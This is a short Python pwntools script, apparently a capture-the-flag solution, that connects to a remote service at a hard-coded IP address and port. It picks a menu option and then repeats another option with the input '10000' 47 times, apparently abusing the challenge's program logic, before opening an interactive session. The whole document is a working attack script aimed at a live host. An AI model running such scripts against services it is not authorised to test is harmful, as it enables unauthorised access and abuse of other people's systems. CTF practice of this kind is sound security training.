from pwn import *

# p = process("./task4_file")
p = remote("62.173.140.174", 17300)
input()
p.sendlineafter(b"(4) Leave.\n\n", b"1")
for i in range(0, 47):
    p.sendlineafter(b"(5) Leave.\n\n", b"3")

    p.sendlineafter(b"\n\n", b'10000')

p.interactive()
